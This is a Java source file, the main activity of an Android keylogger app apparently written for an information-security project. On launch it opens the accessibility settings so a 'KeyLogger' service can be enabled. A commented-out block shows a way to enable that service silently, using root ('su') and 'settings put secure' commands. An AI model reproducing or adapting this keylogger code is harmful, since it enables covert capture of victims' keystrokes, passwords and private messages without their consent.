package com.maemresen.infsec.keylogapp;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Looper;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import com.maemresen.infsec.keylogapp.util.Helper;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private final static String LOG_TAG = Helper.getLogTag(MainActivity.class);

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        (new Startup()).execute();
    }


    private void enableAccessibility() {
        Log.i(LOG_TAG, "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.i(LOG_TAG, "on main thread");
        } else {
            Log.i(LOG_TAG, "not on main thread");
            try {
//                Process process = Runtime.getRuntime().exec("su");
//                DataOutputStream os = new DataOutputStream(process.getOutputStream());
//                os.writeBytes("settings put secure enabled_accessibility_services com.maemresen.infsec.keylogapp/com.maemresen.infsec.keylogapp.KeyLogger\n");
//                os.flush();
//                os.writeBytes("settings put secure accessibility_enabled 1\n");
//                os.flush();
//                os.writeBytes("exit\n");
//                os.flush();
//                process.waitFor();
                Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(openSettings);
            } catch (Exception e) {
                Log.e(LOG_TAG, "Accesibilty Enable Error", e);
            }
        }
    }
}
